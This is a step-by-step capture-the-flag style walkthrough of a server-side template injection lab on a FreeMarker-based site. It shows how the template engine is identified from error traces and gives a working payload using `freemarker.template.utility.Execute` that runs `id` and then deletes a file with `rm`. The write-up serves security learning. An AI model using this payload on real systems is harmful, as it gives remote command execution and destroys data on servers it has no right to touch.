Task 3:
///Lab: Server-side template injection using documentation///

Open the site in burpsuite, log in with the given credentials, go to one of the product's page and press on Edit template.
The end of the template is : <p>Hurry! Only ${product.stock} left of ${product.name} at ${product.price}.</p>
Lets change it to anything: <p>Hurry! Only ${product.stock} left of ${macisajt} at ${product.price}.</p>
And click on preview...As you can see there is a lot of errors:
freemarker.core.EvalUtil.coerceModelToTextualCommon(EvalUtil.java:479) at 
freemarker.core.EvalUtil.coerceModelToStringOrMarkup(EvalUtil.java:401) at 
freemarker.core.EvalUtil.coerceModelToStringOrMarkup(EvalUtil.java:370) at
This indicates us that the site using 'freemarker' template.
If we search on "freemarker template execute arbitrary code" we get this: 
Usage:
From java:

 SimpleHash root = new SimpleHash();

 root.put( "exec", new freemarker.template.utility.Execute() );

 ...
 
From your FreeMarker template:


 The following is executed:
 ${exec( "/usr/bin/ls" )}

This discription indicates that the root user created the 'exec' variable. I've tried it, on the server side there isnt any variable like this, so my next search was that "creating variable in freemarker template"
And i've found this:
Example: Create and replace variables with assign:

Template
<#assign x = 1>  <#-- create variable x -->
${x}
<#assign x = 2> <#-- replace variable x -->
${x}
<#assign x++> <#-- replace variable x -->
${x}

so with this: <#assign x = 1>, and with  "new freemarker.template.utility.Execute()" we can create the exec variable. So i searched on this: "<#assign > freemarker.template.utility.Execute() how to"
And i've found this: <#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")} and now i think all we have to do is replace the "id" with our removing command like this:
<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("rm /home/carlos/morale.txt")}
So Click on Edit template again, delete everything, and copy our payload into, save it, and....thats it. We solved the lab.

